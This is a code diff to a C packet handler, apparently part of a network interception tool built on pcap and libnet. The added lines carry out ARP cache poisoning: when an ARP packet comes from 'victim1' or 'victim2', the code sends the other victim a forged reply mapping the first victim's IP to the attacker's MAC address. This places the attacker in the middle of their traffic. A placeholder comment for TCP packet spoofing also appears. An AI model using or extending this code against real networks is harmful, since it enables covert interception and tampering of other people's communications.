@@ -14,10 +14,11 @@
 
 #include "packetManage.h"
 #include "utils.h"
-
+#include "targets.h"
 
 
 void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
+
 
 	//ARP packet creation and allocation
 	ARP_packet *arp=malloc(sizeof(ARP_packet));
@@ -26,7 +27,19 @@ void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_c
 	if(ARP_packet_construct(arp,header,packet)!=-1){
 		printf("ARP packet detected\n");
 		//do thing with arp object
+
+		//process packets that came from victims
+		if(maccmp(&arp->source,mac_victim1)==0){
+			printf("mac found victim1\n");
+			sendARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,(libnet_t*)args);
+		}
+		if(maccmp(&arp->source,mac_victim2)==0){
+			printf("mac found victim2\n");
+			sendARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,(libnet_t*)args);
+		}
+
 		ARP_free(arp);
+
 		return;
 	}else
 		ARP_free(arp);
@@ -44,7 +57,7 @@ void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_c
 			//spoof packet
 		}
 
-		
+
 		TCP_free(tcp);
 		return;
 	}else
